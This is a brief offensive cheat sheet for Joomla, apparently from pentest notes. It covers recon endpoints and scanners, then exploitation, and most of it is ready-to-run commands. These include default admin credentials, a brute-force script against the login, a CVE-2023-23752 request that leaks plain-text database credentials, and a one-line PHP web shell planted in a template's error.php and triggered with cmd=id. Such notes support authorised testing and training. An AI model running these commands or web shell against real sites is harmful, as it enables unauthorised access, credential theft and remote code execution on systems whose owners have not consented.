# 🖇 Joomla!

## Reconnaissance

### Endpoints | Manual

```
/robots.txt
/README.txt
/LICENSE.txt
/administrator/manifests/files/joomla.xml
/language/en-GB/en-GB.xml
/plugins/system/cache/cache.xml
/web.config
```

### Automatic

```bash
# droopescan
droopescan scan joomla --url http://joomla-site.local/

# joomscan - OWASP 
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
```

## Exploit

### Bruteforce

> **Default credentials :**&#x20;
>
> admin:admin

```bash
wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py
python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### CVE-2023-23752 to Code Execution

```bash
curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true
# Joomla! MySQL credentials plain-text
# Modify a template when logged in
# Site templates > Editor > modify 'error.php' :
system($_GET['cmd']);

# try : 
curl -s http://joomla-site.local/templates/cassiopeia/error.php\?cmd\=id
```
